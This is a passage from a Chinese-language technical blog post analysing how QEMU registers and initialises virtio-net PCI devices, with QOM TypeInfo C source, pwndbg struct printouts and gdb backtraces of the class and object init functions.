 TypeInfo base_type_info = &#123;</span><br><span class="line">        .name          = t-&gt;base_name,</span><br><span class="line">        .parent        = t-&gt;parent ? t-&gt;parent : TYPE_VIRTIO_PCI,</span><br><span class="line">        .instance_size = t-&gt;instance_size,</span><br><span class="line">        .instance_init = t-&gt;instance_init,</span><br><span class="line">        .instance_finalize = t-&gt;instance_finalize,</span><br><span class="line">        .class_size    = t-&gt;class_size,</span><br><span class="line">        .abstract      = <span class="literal">true</span>,</span><br><span class="line">        .interfaces    = t-&gt;interfaces,</span><br><span class="line">    &#125;;</span><br><span class="line">    TypeInfo generic_type_info = &#123;</span><br><span class="line">        .name = t-&gt;generic_name,</span><br><span class="line">        .parent = base_type_info.name,</span><br><span class="line">        .class_init = virtio_pci_generic_class_init,</span><br><span class="line">        .interfaces = (InterfaceInfo[]) &#123;</span><br><span class="line">            &#123; INTERFACE_PCIE_DEVICE &#125;,</span><br><span class="line">            &#123; INTERFACE_CONVENTIONAL_PCI_DEVICE &#125;,</span><br><span class="line">            &#123; &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!base_type_info.name) &#123;</span><br><span class="line">        <span class="comment">/* No base type -&gt; register a single generic device type */</span></span><br><span class="line">        <span class="comment">/* use intermediate %s-base-type to add generic device props */</span></span><br><span class="line">        base_name = g_strdup_printf(<span class="string">&quot;%s-base-type&quot;</span>, t-&gt;generic_name);</span><br><span class="line">        base_type_info.name = base_name;</span><br><span class="line">        base_type_info.class_init = virtio_pci_generic_class_init;</span><br><span class="line"></span><br><span class="line">        generic_type_info.parent = base_name;</span><br><span class="line">        generic_type_info.class_init = virtio_pci_base_class_init;</span><br><span class="line">        generic_type_info.class_data = (<span class="type">void</span> *)t;</span><br><span class="line"></span><br><span class="line">        assert(!t-&gt;non_transitional_name);</span><br><span class="line">        assert(!t-&gt;transitional_name);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        base_type_info.class_init = virtio_pci_base_class_init;</span><br><span class="line">        base_type_info.class_data = (<span class="type">void</span> *)t;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    type_register(&amp;base_type_info);</span><br><span class="line">    <span class="keyword">if</span> (generic_type_info.name) &#123;</span><br><span class="line">        type_register(&amp;generic_type_info);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>实际最后会生成如下的<strong>TypeInfo</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; frame </span><br><span class="line"><span class="comment">#0  virtio_pci_types_register (t=0x555556ed8840 &lt;virtio_net_pci_info&gt;) at ../../qemu/hw/virtio/virtio-pci.c:2616</span></span><br><span class="line">2616    <span class="keyword">if</span> (t-&gt;non_transitional_name) &#123;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; p generic_type_info </span><br><span class="line"><span class="variable">$1</span> = &#123;</span><br><span class="line">  name = 0x5555562ddbf5 <span class="string">&quot;virtio-net-pci&quot;</span>,</span><br><span class="line">  parent = 0x5555562ddbb6 <span class="string">&quot;virtio-net-pci-base&quot;</span>,</span><br><span class="line">  instance_size = 0,</span><br><span class="line">  instance_align = 0,</span><br><span class="line">  instance_init = 0x0,</span><br><span class="line">  instance_post_init = 0x0,</span><br><span class="line">  instance_finalize = 0x0,</span><br><span class="line">  abstract = <span class="literal">false</span>,</span><br><span class="line">  class_size = 0,</span><br><span class="line">  class_init = 0x555555b74f0b &lt;virtio_pci_generic_class_init&gt;,</span><br><span class="line">  class_base_init = 0x0,</span><br><span class="line">  class_data = 0x0,</span><br><span class="line">  interfaces = 0x7fffffffd700</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><p>要想分析<strong>virtio设备</strong>的初始化过程，需要罗列相关的<strong>TypeInfo</strong>变量，如下所示<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p generic_type_info </span><br><span class="line"><span class="variable">$4</span> = &#123;</span><br><span class="line">  name = 0x5555562ddbf5 <span class="string">&quot;virtio-net-pci&quot;</span>,</span><br><span class="line">  parent = 0x5555562ddbb6 <span class="string">&quot;virtio-net-pci-base&quot;</span>,</span><br><span class="line">  instance_size = 0,</span><br><span class="line">  instance_align = 0,</span><br><span class="line">  instance_init = 0x0,</span><br><span class="line">  instance_post_init = 0x0,</span><br><span class="line">  instance_finalize = 0x0,</span><br><span class="line">  abstract = <span class="literal">false</span>,</span><br><span class="line">  class_size = 0,</span><br><span class="line">  class_init = 0x555555b74f0b &lt;virtio_pci_generic_class_init&gt;,</span><br><span class="line">  class_base_init = 0x0,</span><br><span class="line">  class_data = 0x0,</span><br><span class="line">  interfaces = 0x7fffffffd700</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; p base_type_info </span><br><span class="line"><span class="variable">$5</span> = &#123;</span><br><span class="line">  name = 0x5555562ddbb6 <span class="string">&quot;virtio-net-pci-base&quot;</span>,</span><br><span class="line">  parent = 0x55555626674d <span class="string">&quot;virtio-pci&quot;</span>,</span><br><span class="line">  instance_size = 43376,</span><br><span class="line">  instance_align = 0,</span><br><span class="line">  instance_init = 0x555555e0fa2b &lt;virtio_net_pci_instance_init&gt;,</span><br><span class="line">  instance_post_init = 0x0,</span><br><span class="line">  instance_finalize = 0x0,</span><br><span class="line">  abstract = <span class="literal">true</span>,</span><br><span class="line">  class_size = 0,</span><br><span class="line">  class_init = 0x555555b74ec1 &lt;virtio_pci_base_class_init&gt;,</span><br><span class="line">  class_base_init = 0x0,</span><br><span class="line">  class_data = 0x555556ed8840 &lt;virtio_net_pci_info&gt;,</span><br><span class="line">  interfaces = 0x0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; p virtio_pci_info </span><br><span class="line"><span class="variable">$6</span> = &#123;</span><br><span class="line">  name = 0x55555626674d <span class="string">&quot;virtio-pci&quot;</span>,</span><br><span class="line">  parent = 0x5555562666ba <span class="string">&quot;pci-device&quot;</span>,</span><br><span class="line">  instance_size = 34032,</span><br><span class="line">  instance_align = 0,</span><br><span class="line">  instance_init = 0x0,</span><br><span class="line">  instance_post_init = 0x0,</span><br><span class="line">  instance_finalize = 0x0,</span><br><span class="line">  abstract = <span class="literal">true</span>,</span><br><span class="line">  class_size = 248,</span><br><span class="line">  class_init = 0x555555b74dd1 &lt;virtio_pci_class_init&gt;,</span><br><span class="line">  class_base_init = 0x0,</span><br><span class="line">  class_data = 0x0,</span><br><span class="line">  interfaces = 0x0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; p pci_device_type_info</span><br><span class="line"><span class="variable">$7</span> = &#123;</span><br><span class="line">  name = 0x55555623a47a <span class="string">&quot;pci-device&quot;</span>,</span><br><span class="line">  parent = 0x55555623a35d <span class="string">&quot;device&quot;</span>,</span><br><span class="line">  instance_size = 2608,</span><br><span class="line">  instance_align = 0,</span><br><span class="line">  instance_init = 0x0,</span><br><span class="line">  instance_post_init = 0x0,</span><br><span class="line">  instance_finalize = 0x0,</span><br><span class="line">  abstract = <span class="literal">true</span>,</span><br><span class="line">  class_size = 232,</span><br><span class="line">  class_init = 0x555555a9c002 &lt;pci_device_class_init&gt;,</span><br><span class="line">  class_base_init = 0x555555a9c07d &lt;pci_device_class_base_init&gt;,</span><br><span class="line">  class_data = 0x0,</span><br><span class="line">  interfaces = 0x0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; p device_type_info </span><br><span class="line"><span class="variable">$8</span> = &#123;</span><br><span class="line">  name = 0x5555562f9c0d <span class="string">&quot;device&quot;</span>,</span><br><span class="line">  parent = 0x5555562f9f27 <span class="string">&quot;object&quot;</span>,</span><br><span class="line">  instance_size = 160,</span><br><span class="line">  instance_align = 0,</span><br><span class="line">  instance_init = 0x555555e9ca7f &lt;device_initfn&gt;,</span><br><span class="line">  instance_post_init = 0x555555e9caf9 &lt;device_post_init&gt;,</span><br><span class="line">  instance_finalize = 0x555555e9cb30 &lt;device_finalize&gt;,</span><br><span class="line">  abstract = <span class="literal">true</span>,</span><br><span class="line">  class_size = 176,</span><br><span class="line">  class_init = 0x555555e9cf54 &lt;device_class_init&gt;,</span><br><span class="line">  class_base_init = 0x555555e9cd10 &lt;device_class_base_init&gt;,</span><br><span class="line">  class_data = 0x0,</span><br><span class="line">  interfaces = 0x5555570085a0 &lt;__compound_literal.0&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看到，<strong>virtio_pci_info</strong>的<strong>class_size</strong>字段非0，因此<strong>virtio设备</strong>使用<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/include/hw/virtio/virtio-pci.h#L108"><strong>struct VirtioPCIClass</strong></a>表征其类信息；<strong>base_type_info</strong>的<strong>instance_size</strong>字段非0，根据前面<a href="#virtio设备">virtio设备</a>小节的内容，因此<strong>virtio设备</strong>使用<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/virtio/virtio-net-pci.c#L36"><strong>struct VirtIONetPCI</strong></a>表征其对象信息。</p><h3 id="类初始化"><a href="#类初始化" class="headerlink" title="类初始化"></a>类初始化</h3><p>根据<a href="#初始化">前面小节</a>的内容，<strong>virtio设备</strong>使用<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/virtio/virtio-pci.c#L2546"><strong>virtio_pci_generic_class_init()</strong></a>、<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/virtio/virtio-pci.c#L2538"><strong>virtio_pci_base_class_init()</strong></a>、<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/virtio/virtio-pci.c#L2504"><strong>virtio_pci_class_init()</strong></a>、<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/pci/pci.c#L2628"><strong>pci_device_class_init()</strong></a>和<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/core/qdev.c#L801"><strong>device_class_init()</strong></a>分别初始化对应的类数据结构，如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">virtio_pci_generic_class_init</span><span class="params">(ObjectClass *klass, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    DeviceClass *dc = DEVICE_CLASS(klass);</span><br><span class="line"></span><br><span class="line">    device_class_set_props(dc, virtio_pci_generic_properties);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">virtio_pci_base_class_init</span><span class="params">(ObjectClass *klass, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> VirtioPCIDeviceTypeInfo *t = data;</span><br><span class="line">    <span class="keyword">if</span> (t-&gt;class_init) &#123;</span><br><span class="line">        t-&gt;class_init(klass, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">virtio_pci_class_init</span><span class="params">(ObjectClass *klass, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    DeviceClass *dc = DEVICE_CLASS(klass);</span><br><span class="line">    PCIDeviceClass *k = PCI_DEVICE_CLASS(klass);</span><br><span class="line">    VirtioPCIClass *vpciklass = VIRTIO_PCI_CLASS(klass);</span><br><span class="line">    ResettableClass *rc = RESETTABLE_CLASS(klass);</span><br><span class="line"></span><br><span class="line">    device_class_set_props(dc, virtio_pci_properties);</span><br><span class="line">    k-&gt;realize = virtio_pci_realize;</span><br><span class="line">    k-&gt;<span class="built_in">exit</span> = virtio_pci_exit;</span><br><span class="line">    k-&gt;vendor_id = PCI_VENDOR_ID_REDHAT_QUMRANET;</span><br><span class="line">    k-&gt;revision = VIRTIO_PCI_ABI_VERSION;</span><br><span class="line">    k-&gt;class_id = PCI_CLASS_OTHERS;</span><br><span class="line">    device_class_set_parent_realize(dc, virtio_pci_dc_realize,</span><br><span class="line">                                    &amp;vpciklass-&gt;parent_dc_realize);</span><br><span class="line">    rc-&gt;phases.hold = virtio_pci_bus_reset_hold;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">pci_device_class_init</span><span class="params">(ObjectClass *klass, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    DeviceClass *k = DEVICE_CLASS(klass);</span><br><span class="line"></span><br><span class="line">    k-&gt;realize = pci_qdev_realize;</span><br><span class="line">    k-&gt;unrealize = pci_qdev_unrealize;</span><br><span class="line">    k-&gt;bus_type = TYPE_PCI_BUS;</span><br><span class="line">    device_class_set_props(k, pci_props);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">device_class_init</span><span class="params">(ObjectClass *class, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    DeviceClass *dc = DEVICE_CLASS(class);</span><br><span class="line">    VMStateIfClass *vc = VMSTATE_IF_CLASS(class);</span><br><span class="line">    ResettableClass *rc = RESETTABLE_CLASS(class);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span>-&gt;</span>unparent = device_unparent;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* by default all devices were considered as hotpluggable,</span></span><br><span class="line"><span class="comment">     * so with intent to check it in generic qdev_unplug() /</span></span><br><span class="line"><span class="comment">     * device_set_realized() functions make every device</span></span><br><span class="line"><span class="comment">     * hotpluggable. Devices that shouldn&#x27;t be hotpluggable,</span></span><br><span class="line"><span class="comment">     * should override it in their class_init()</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    dc-&gt;hotpluggable = <span class="literal">true</span>;</span><br><span class="line">    dc-&gt;user_creatable = <span class="literal">true</span>;</span><br><span class="line">    vc-&gt;get_id = device_vmstate_if_get_id;</span><br><span class="line">    rc-&gt;get_state = device_get_reset_state;</span><br><span class="line">    rc-&gt;child_foreach = device_reset_child_foreach;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * @device_phases_reset is put as the default reset method below, allowing</span></span><br><span class="line"><span class="comment">     * to do the multi-phase transition from base classes to leaf classes. It</span></span><br><span class="line"><span class="comment">     * allows a legacy-reset Device class to extend a multi-phases-reset</span></span><br><span class="line"><span class="comment">     * Device class for the following reason:</span></span><br><span class="line"><span class="comment">     * + If a base class B has been moved to multi-phase, then it does not</span></span><br><span class="line"><span class="comment">     *   override this default reset method and may have defined phase methods.</span></span><br><span class="line"><span class="comment">     * + A child class C (extending class B) which uses</span></span><br><span class="line"><span class="comment">     *   device_class_set_parent_reset() (or similar means) to override the</span></span><br><span class="line"><span class="comment">     *   reset method will still work as expected. @device_phases_reset function</span></span><br><span class="line"><span class="comment">     *   will be registered as the parent reset method and effectively call</span></span><br><span class="line"><span class="comment">     *   parent reset phases.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    dc-&gt;reset = device_phases_reset;</span><br><span class="line">    rc-&gt;get_transitional_function = device_get_transitional_reset;</span><br><span class="line"></span><br><span class="line">    object_class_property_add_bool(class, <span class="string">&quot;realized&quot;</span>,</span><br><span class="line">                                   device_get_realized, device_set_realized);</span><br><span class="line">    object_class_property_add_bool(class, <span class="string">&quot;hotpluggable&quot;</span>,</span><br><span class="line">                                   device_get_hotpluggable, <span class="literal">NULL</span>);</span><br><span class="line">    object_class_property_add_bool(class, <span class="string">&quot;hotplugged&quot;</span>,</span><br><span class="line">                                   device_get_hotplugged, <span class="literal">NULL</span>);</span><br><span class="line">    object_class_property_add_link(class, <span class="string">&quot;parent_bus&quot;</span>, TYPE_BUS,</span><br><span class="line">                                   offsetof(DeviceState, parent_bus), <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>其中，根据<a href="#初始化">前面初始化</a>的内容，<strong>virtio_pci_base_class_init()</strong>的参数是<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/virtio/virtio-net-pci.c#L93"><strong>virtio_net_pci_info</strong></a>，其<strong>class_init</strong>字段为<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/virtio/virtio-net-pci.c#L67"><strong>virtio_net_pci_class_init()</strong></a>，如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">virtio_net_pci_class_init</span><span class="params">(ObjectClass *klass, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    DeviceClass *dc = DEVICE_CLASS(klass);</span><br><span class="line">    PCIDeviceClass *k = PCI_DEVICE_CLASS(klass);</span><br><span class="line">    VirtioPCIClass *vpciklass = VIRTIO_PCI_CLASS(klass);</span><br><span class="line"></span><br><span class="line">    k-&gt;romfile = <span class="string">&quot;efi-virtio.rom&quot;</span>;</span><br><span class="line">    k-&gt;vendor_id = PCI_VENDOR_ID_REDHAT_QUMRANET;</span><br><span class="line">    k-&gt;device_id = PCI_DEVICE_ID_VIRTIO_NET;</span><br><span class="line">    k-&gt;revision = VIRTIO_PCI_ABI_VERSION;</span><br><span class="line">    k-&gt;class_id = PCI_CLASS_NETWORK_ETHERNET;</span><br><span class="line">    set_bit(DEVICE_CATEGORY_NETWORK, dc-&gt;categories);</span><br><span class="line">    device_class_set_props(dc, virtio_net_properties);</span><br><span class="line">    vpciklass-&gt;realize = virtio_net_pci_realize;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>可以看到，这些类的初始化基本就是覆盖父类的<strong>realize</strong>函数指针或当前类的<strong>parent_dc_realize</strong>函数指针，从而在实例化时执行相关的逻辑</p><h3 id="对象初始化"><a href="#对象初始化" class="headerlink" title="对象初始化"></a>对象初始化</h3><p><strong>virtio设备</strong>使用<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/virtio/virtio-net-pci.c#L83"><strong>virtio_net_pci_instance_init()</strong></a>和<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/core/qdev.c#L652"><strong>device_initfn()</strong></a>来初始化对应的对象数据结构，如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//#0  virtio_net_pci_instance_init (obj=0x5555580bdd70) at ../../qemu/hw/virtio/virtio-net-pci.c:85</span></span><br><span class="line"><span class="comment">//#1  0x0000555555ea793a in object_init_with_type (obj=0x5555580bdd70, ti=0x5555570e88f0) at ../../qemu/qom/object.c:429</span></span><br><span class="line"><span class="comment">//#2  0x0000555555ea791c in object_init_with_type (obj=0x5555580bdd70, ti=0x5555570e8ab0) at ../../qemu/qom/object.c:425</span></span><br><span class="line"><span class="comment">//#3  0x0000555555ea7f00 in object_initialize_with_type (obj=0x5555580bdd70, size=43376, type=0x5555570e8ab0) at ../../qemu/qom/object.c:571</span></span><br><span class="line"><span class="comment">//#4  0x0000555555ea86cf in object_new_with_type (type=0x5555570e8ab0) at ../../qemu/qom/object.c:791</span></span><br><span class="line"><span class="comment">//#5  0x0000555555ea873b in object_new (typename=0x5555580bbfd0 &quot;virtio-net-pci&quot;) at ../../qemu/qom/object.c:806</span></span><br><span class="line"><span class="comment">//#6  0x0000555555e9ff6a in qdev_new (name=0x5555580bbfd0 &quot;virtio-net-pci&quot;) at ../../qemu/hw/core/qdev.c:166</span></span><br><span class="line"><span class="comment">//#7  0x0000555555bd01c4 in qdev_device_add_from_qdict (opts=0x5555580bc3b0, from_json=false, errp=0x7fffffffd6a0) at ../../qemu/system/qdev-monitor.c:681</span></span><br><span class="line"><span class="comment">//#8  0x0000555555bd03d9 in qdev_device_add (opts=0x5555570f7230, errp=0x55555706a160 &lt;error_fatal&gt;) at ../../qemu/system/qdev-monitor.c:737</span></span><br><span class="line"><span class="comment">//#9  0x0000555555bda4e7 in device_init_func (opaque=0x0, opts=0x5555570f7230, errp=0x55555706a160 &lt;error_fatal&gt;) at ../../qemu/system/vl.c:1200</span></span><br><span class="line"><span class="comment">//#10 0x00005555560c2a63 in qemu_opts_foreach (list=0x555556f53ec0 &lt;qemu_device_opts&gt;, func=0x555555bda4bc &lt;device_init_func&gt;, opaque=0x0, errp=0x55555706a160 &lt;error_fatal&gt;) at ../../qemu/util/qemu-option.c:1135</span></span><br><span class="line"><span class="comment">//#11 0x0000555555bde1b8 in qemu_create_cli_devices () at ../../qemu/system/vl.c:2637</span></span><br><span class="line"><span class="comment">//#12 0x0000555555bde3fe in qmp_x_exit_preconfig (errp=0x55555706a160 &lt;error_fatal&gt;) at ../../qemu/system/vl.c:2706</span></span><br><span class="line"><span class="comment">//#13 0x0000555555be0db6 in qemu_init (argc=39, argv=0x7fffffffdae8) at ../../qemu/system/vl.c:3739</span></span><br><span class="line"><span class="comment">//#14 0x0000555555e9b7ed in main (argc=39, argv=0x7fffffffdae8) at ../../qemu/system/main.c:47</span></span><br><span class="line"><span class="comment">//#15 0x00007ffff7629d90 in __libc_start_call_main (main=main@entry=0x555555e9b7c9 &lt;main&gt;, argc=argc@entry=39, argv=argv@entry=0x7fffffffdae8) at ../sysdeps/nptl/libc_start_call_main.h:58</span></span><br><span class="line"><span class="comment">//#16 0x00007ffff7629e40 in __libc_start_main_impl (main=0x555555e9b7c9 &lt;main&gt;, argc=39, argv=0x7fffffffdae8, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7fffffffdad8) at ../csu/libc-start.c:392</span></span><br><span class="line"><span class="comment">//#17 0x000055555586f0d5 in _start ()</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">virtio_net_pci_instance_init</span><span class="params">(Object *obj)</span></span><br><span class="line">&#123;</span><br><span class="line">    VirtIONetPCI *dev = VIRTIO_NET_PCI(obj);</span><br><span class="line"></span><br><span class="line">    virtio_instance_init_common(obj, &amp;dev-&gt;vdev, <span class="keyword">sizeof</span>(dev-&gt;vdev),</span><br><span class="line">                                TYPE_VIRTIO_NET);</span><br><span class="line">    object_property_add_alias(obj, <span class="string">&quot;bootindex&quot;</span>, OBJECT(&amp;dev-&gt;vdev),</span><br><span class="line">                              <span class="string">&quot;bootindex&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//#0  device_initfn (obj=0x5555580bdd70) at ../../qemu/hw/core/qdev.c:654</span></span><br><span class="line"><span class="comment">//#1  0x0000555555ea793a in object_init_with_type (obj=0x5555580bdd70, ti=0x5555570ec4a0) at ../../qemu/qom/object.c:429</span></span><br><span class="line"><span class="comment">//#2  0x0000555555ea791c in object_init_with_type (obj=0x5555580bdd70, ti=0x5555570a7830) at ../../qemu/qom/object.c:425</span></span><br><span class="line"><span class="comment">//#3  0x0000555555ea791c in object_init_with_type (obj=0x5555580bdd70, ti=0x5555570b5a80) at ../../qemu/qom/object.c:425</span></span><br><span class="line"><span class="comment">//#4  0x0000555555ea791c in object_init_with_type (obj=0x5555580bdd70, ti=0x5555570e88f0) at ../../qemu/qom/object.c:425</span></span><br><span class="line"><span class="comment">//#5  0x0000555555ea791c in object_init_with_type (obj=0x5555580bdd70, ti=0x5555570e8ab0) at ../../qemu/qom/object.c:425</span></span><br><span class="line"><span class="comment">//#6  0x0000555555ea7f00 in object_initialize_with_type (obj=0x5555580bdd70, size=43376, 